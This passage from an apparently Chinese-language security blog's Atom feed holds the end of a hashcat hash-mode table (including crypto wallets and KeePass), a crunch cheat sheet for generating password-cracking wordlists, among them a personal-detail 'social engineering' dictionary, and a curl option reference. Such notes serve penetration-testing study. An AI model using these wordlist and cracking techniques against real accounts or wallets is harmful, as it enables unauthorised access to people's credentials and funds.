class="gutter"><pre><span class="line">269</span></pre></td><td class="code"><pre><span class="line">12700 | Blockchain, My Wallet                            | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">270</span></pre></td><td class="code"><pre><span class="line">15200 | Blockchain, My Wallet, V2                        | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">271</span></pre></td><td class="code"><pre><span class="line">16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">272</span></pre></td><td class="code"><pre><span class="line">13400 | KeePass 1 (AES&#x2F;Twofish) and KeePass 2 (AES)      | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">273</span></pre></td><td class="code"><pre><span class="line">15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">274</span></pre></td><td class="code"><pre><span class="line">15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">275</span></pre></td><td class="code"><pre><span class="line">15700 | Ethereum Wallet, SCRYPT                          | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">276</span></pre></td><td class="code"><pre><span class="line">16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">277</span></pre></td><td class="code"><pre><span class="line">16900 | Ansible Vault                                    | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">278</span></pre></td><td class="code"><pre><span class="line">18100 | TOTP (HMAC-SHA1)                                 | One-Time Passwords</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">279</span></pre></td><td class="code"><pre><span class="line">99999 | Plaintext                                        | Plaintext</span></pre></td></tr></table></figure></li></ul><pre><code>```</code></pre>]]></content>
    
    <summary type="html">
    
      利用hashcat进行hash密码破解
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="kali" scheme="http://h3art3ars.github.io/tags/kali/"/>
    
      <category term="hash密码破解" scheme="http://h3art3ars.github.io/tags/hash%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>crunch</title>
    <link href="http://h3art3ars.github.io/2019/12/11/crunch/"/>
    <id>http://h3art3ars.github.io/2019/12/11/crunch/</id>
    <published>2019-12-11T06:36:27.000Z</published>
    <updated>2019-12-11T06:39:27.175Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h1><ul><li><h2 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">crunch 4 4 -t %^@,    &#x2F;&#x2F;生成4位数字，特殊字符，小写大写字母</span></pre></td></tr></table></figure></li><li><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">min    设定最小字符串长度（必选）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  max    设定最大字符串长度（必选）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  &#x2F;&#x2F;默认位小写字符集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  oprions</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  -b     指定文件输出的大小，避免字典文件过大  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  -c     指定文件输出的行数，即包含密码的个数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  -d     限制相同元素出现的次数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  -e     定义停止字符，即到该字符串就停止生成</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  -f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  -i     改变输出格式，即aaa,aab -&gt; aaa,baa</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  -I     通常与-t联合使用，表明该字符为实义字符</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  -m     通常与-p搭配</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  -o     将密码保存到指定文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  -p     指定元素以组合的方式进行</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  -q     读取密码文件，即读取pass.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  -r     定义重某一字符串重新开始</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  -s     指定一个开始的字符，即从自己定义的密码xxxx开始</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  -t     指定密码输出的格式</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  -u     禁止打印百分比（必须为最后一个选项）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z</span></pre></td></tr></table></figure><ul><li><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol><li><p>生成自己制定字符集的字典(字符集中有空格需要双引号或者空格转义)</p><p><code>crunch 2 4 &quot;abc &quot;</code></p></li><li><p>生成数个元素组合（社工字典 max min参数无效）</p><p><code>crunch 4 4 -p zhangsan 2018 0101</code></p></li><li><p>生成某字符串的所有组合</p><p><code>crunch 4 4 -p abc</code></p></li><li><p>生成指定格式字符串</p><p><code>crunch 4 4 -t %^@, -o ./dict.txt</code></p></li><li><p>设置字符集</p><p><code>crunch 6 6 -f /usr/share/crunch/charset.lst 字符集 -t %%dog@ //@表示当前字符集</code></p></li><li><p>指定某类字符的集合</p><p>生成3位密码，第一位由是123，第三位bcd,<strong>+为占位符</strong></p><p><code>crunch 3 3 bcd + 123 + -t %@^ -f charset.lst  mixalpha-numeric-all-space</code></p></li><li><p>生成5个元素组成的密码，前三个为固定字符，后两个为小写大写字符,<strong>d为占位符</strong></p><p><code>crunch 5 5 -t ddd@, -p dog cat bird</code></p></li><li><p>去除-t参数中的特殊字符含义,<strong>a为占位符</strong></p><p><code>crunch 5 5 -t p@as% -I a@aaa</code></p></li></ol></li><li><p>详情</p><p><a href="https://blog.csdn.net/fox_wayen/article/details/78429140" target="_blank" rel="noopener">详解</a></p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      crunch 生成字典
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="kali" scheme="http://h3art3ars.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>curl</title>
    <link href="http://h3art3ars.github.io/2019/12/11/curl/"/>
    <id>http://h3art3ars.github.io/2019/12/11/curl/</id>
    <published>2019-12-11T06:20:07.000Z</published>
    <updated>2019-12-17T01:35:06.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 </p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：# curl [option] [url]</span></pre></td></tr></table></figure><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-A&#x2F;--user-agent &lt;string&gt;                  设置UA发送给服务器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-b&#x2F;--cookie &lt;name&#x3D;string&#x2F;file&gt;        cookie字符串或文件读取位置</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-c&#x2F;--cookie-jar &lt;file&gt;                    操作结束后把cookie写入到这个文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">-C&#x2F;--continue-at &lt;offset&gt;             断点续转</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">-D&#x2F;--dump-header &lt;file&gt;               把header信息写入到该文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">-e&#x2F;--referer                              来源网址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">-f&#x2F;--fail                                 连接失败时不显示http错误</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">-o&#x2F;--output                               把输出写到该文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-O&#x2F;--remote-name                       把输出写到该文件中，保留远程文件的文件名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">-r&#x2F;--range &lt;range&gt;                        检索来自HTTP&#x2F;1.1或FTP服务器字节范围</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">-s&#x2F;--silent                               静音模式。不输出任何东西</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">-T&#x2F;--upload-file &lt;file&gt;                   上传文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">-u&#x2F;--user &lt;user[:password]&gt;          设置服务器的用户和密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">-w&#x2F;--write-out [format]                   什么输出完成后</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">-x&#x2F;--proxy &lt;host[:port]&gt;                 在给定的端口上使用HTTP代理</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">-#&#x2F;--progress-bar                         进度条显示当前的传送状态</span></pre></td></tr></table></figure><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><ol><li><p><code>curl http://www.befallhell.cn</code></p><p>将结果输出到标准输出</p></li><li><p><code>curl http://www.befallhell.com &gt;&gt; file</code></p><p><code>curl http://www.befallhell.com -o file</code></p><p><code>curl  -O http://www.befallhell.cn/test.html</code></p><p>结果输出到文件或服务端同名文件</p><ol start="3"><li><p><code>curl -o /dev/null -s -w %{http_code} http://www.befallhell.cn</code></p><p>测试网页返回值 </p></li></ol></li><li><p><code>curl -x 192.168.100.100:1080 http://www.befallhell.cn</code></p><p> 指定proxy服务器以及其端口 </p></li><li><p><code>curl -c cookies.txt http://www.befallhell.cn</code></p><p><code>curl -D header.txt http://www.befallhell.cn</code></p><p>保存cookie与header</p></li><li><p><code>curl -b cookies.txt http://www.befallhell.cn</code></p><p>使用cookies文件</p></li><li><p><code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot;  http://www.befallhell.cn</code></p><p>更改</p></li><li><p><code>curl -e &quot;127.0.0.1&quot; http://www.befallhell.cn</code></p><p> 伪造referer</p></li><li><p><code>curl -O -# ftp://用户名:密码@http://www.befallhell.cn/1.jpg</code></p><p> ftp下载并显示下载进度条</p></li><li><p><code>curl -T dodo1.JPG -u 用户名:密码 ftp://http://www.befallhell.cn/public/</code></p><p>上传文件</p></li><li><p><code>curl -I http://www.befallhell.cn</code></p><p> 显示头信息</p></li><li><p>get方法</p><p> <code>curl &quot;http://ip?id=1&quot;</code></p></li><li><p>-H –header 使用时要多次使用</p><p> <code>curl -H &quot;Host:127.0.0.1&quot; -H &quot;Referer: 127.0.0.1&quot;</code></p></li><li><p><code>-A</code>,<code>-b</code>,<code>-e</code> 分别是<code>user-agent,cookie,referer,</code></p></li></ol><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-a&#x2F;--append                        上传文件时，附加到目标文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">--anyauth                            可以使用“任何”身份验证方法</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">--basic                                使用HTTP基本验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">-B&#x2F;--use-ascii                      使用ASCII文本传输</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">*-d&#x2F;--data &lt;data&gt;                  HTTP POST方式传送数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">--data-ascii &lt;data&gt;            以ascii的方式post数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">--data-binary &lt;data&gt;          以二进制的方式post数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">--negotiate                          使用HTTP身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">--digest                        使用数字身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">--disable-eprt                  禁止使用EPRT或LPRT</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">--disable-epsv                  禁止使用EPSV</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">--egd-file &lt;file&gt;              为随机数据(SSL)设置EGD socket路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">--tcp-nodelay                  使用TCP_NODELAY选项</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">-E&#x2F;--cert &lt;cert[:passwd]&gt;      客户端证书文件和密码 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">--cert-type &lt;type&gt;              证书文件类型 (DER&#x2F;PEM&#x2F;ENG) (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">--key &lt;key&gt;                    私钥文件名 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">--key-type &lt;type&gt;              私钥文件类型 (DER&#x2F;PEM&#x2F;ENG) (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">--pass  &lt;pass&gt;                  私钥密码 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">--engine &lt;eng&gt;                  加密引擎使用 (SSL). &quot;--engine list&quot; for list</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">--cacert &lt;file&gt;                CA证书 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">--capath &lt;directory&gt;            CA目   (made using c_rehash) to verify peer against (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">--ciphers &lt;list&gt;                SSL密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">--compressed                    要求返回是压缩的形势 (using deflate or gzip)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">--connect-timeout &lt;seconds&gt;    设置最大请求时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">--create-dirs                  建立本地目录的目录层次结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">--crlf                          上传是把LF转变成CRLF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">--ftp-create-dirs              如果远程目录不存在，创建远程目录</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">--ftp-method [multicwd&#x2F;nocwd&#x2F;singlecwd]    控制CWD的使用</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">--ftp-pasv                      使用 PASV&#x2F;EPSV 代替端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">--ftp-skip-pasv-ip              使用PASV的时候,忽略该IP地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">--ftp-ssl                      尝试用 SSL&#x2F;TLS 来进行ftp数据传输</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">--ftp-ssl-reqd                  要求用 SSL&#x2F;TLS 来进行ftp数据传输</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">*-F&#x2F;--form &lt;name&#x3D;content&gt;        模拟http表单提交数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">-form-string &lt;name&#x3D;string&gt;      模拟http表单提交数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">-g&#x2F;--globoff                    禁用网址序列和范围使用&#123;&#125;和[]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">* -G&#x2F;--get                        以get的方式来发送数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">-h&#x2F;--help                      帮助</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">*-H&#x2F;--header &lt;line&gt;              自定义头信息传递给服务器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">--ignore-content-length        忽略的HTTP头信息的长度</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">-i&#x2F;--include                    输出时包括protocol头信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">*-I&#x2F;--head                      只显示文档信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">-j&#x2F;--junk-session-cookies      读取文件时忽略session cookie</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">--interface &lt;interface&gt;        使用指定网络接口&#x2F;地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">--krb4 &lt;level&gt;                  使用指定安全级别的krb4</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">-k&#x2F;--insecure                  允许不使用证书到SSL站点</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">-K&#x2F;--config                    指定的配置文件读取</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">-l&#x2F;--list-only                  列出ftp目录下的文件名称</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">--limit-rate &lt;rate&gt;            设置传输速度</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">--local-port&lt;NUM&gt;              强制使用本地端口号</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">-m&#x2F;--max-time &lt;seconds&gt;        设置最大传输时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">--max-redirs &lt;num&gt;              设置最大读取的目录数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">--max-filesize &lt;bytes&gt;          设置最大下载的文件总量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">-M&#x2F;--manual                    显示全手动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">-n&#x2F;--netrc                      从netrc文件中读取用户名和密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">--netrc-optional                使用 .netrc 或者 URL来覆盖-n</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">--ntlm                          使用 HTTP NTLM 身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">-N&#x2F;--no-buffer                  禁用缓冲输出</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">-p&#x2F;--proxytunnel                使用HTTP代理</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">--proxy-anyauth                选择任一代理身份验证方法</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">--proxy-basic                  在代理上使用基本身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">--proxy-digest                  在代理上使用数字身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">--proxy-ntlm                    在代理上使用ntlm身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">-P&#x2F;--ftp-port &lt;address&gt;        使用端口地址，而不是使用PASV</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">-Q&#x2F;--quote &lt;cmd&gt;                文件传输前，发送命令到服务器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">--range-file                    读取（SSL）的随机文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">-R&#x2F;--remote-time                在本地生成文件时，保留远程文件时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">--retry &lt;num&gt;                  传输出现问题时，重试的次数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">--retry-delay &lt;seconds&gt;        传输出现问题时，设置重试间隔时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">--retry-max-time &lt;seconds&gt;      传输出现问题时，设置最大重试时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">-S&#x2F;--show-error                显示错误</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">--socks4 &lt;host[:port]&gt;          用socks4代理给定主机和端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">--socks5 &lt;host[:port]&gt;          用socks5代理给定主机和端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">-t&#x2F;--telnet-option &lt;OPT&#x3D;val&gt;    Telnet选项设置</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">--trace &lt;file&gt;                  对指定文件进行debug</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">--trace-ascii &lt;file&gt;            Like --跟踪但没有hex输出</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">--trace-time                    跟踪&#x2F;详细输出时，添加时间戳</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">--url &lt;URL&gt;                    Spet URL to work with</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">-U&#x2F;--proxy-user &lt;user[:password]&gt;  设置代理用户名和密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">-V&#x2F;--version                    显示版本信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">-X&#x2F;--request &lt;command&gt;          指定什么命令</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">-y&#x2F;--speed-time                放弃限速所要的时间。默认为30</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">-Y&#x2F;--speed-limit                停止传输速度的限制，速度时间&#39;秒</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">-z&#x2F;--time-cond                  传送时间设置</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">-0&#x2F;--http1.0                    使用HTTP 1.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">-1&#x2F;--tlsv1                      使用TLSv1（SSL）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">-2&#x2F;--sslv2                      使用SSLv2的（SSL）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">-3&#x2F;--sslv3                      使用的SSLv3（SSL）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line">--3p-quote                      like -Q for the source URL for 3rd party transfer</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">--3p-url                        使用url，进行第三方传送</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">--3p-user                      使用用户名和密码，进行第三方传送</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line">-4&#x2F;--ipv4                      使用IP4</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">-6&#x2F;--ipv6                      使用IP6</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://h3art3ars.github.io/2019/12/09/hello-world/"/>
    <id>http://h3art3ars.github.io/2019/12/09/hello-world/</id>
    <published>2019-12-09T14:44:38.260Z</published>
    <updated>2019-12-11T07:37:10.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="纪念新博客"><a href="#纪念新博客" class="headerlink" title="纪念新博客"></a>纪念新博客</h1><p><code>至此</code></p>]]></content>
    
    <summary type="html">
    
      the first page
    
    </summary>
    
    
    
  </entry>
  
</feed>
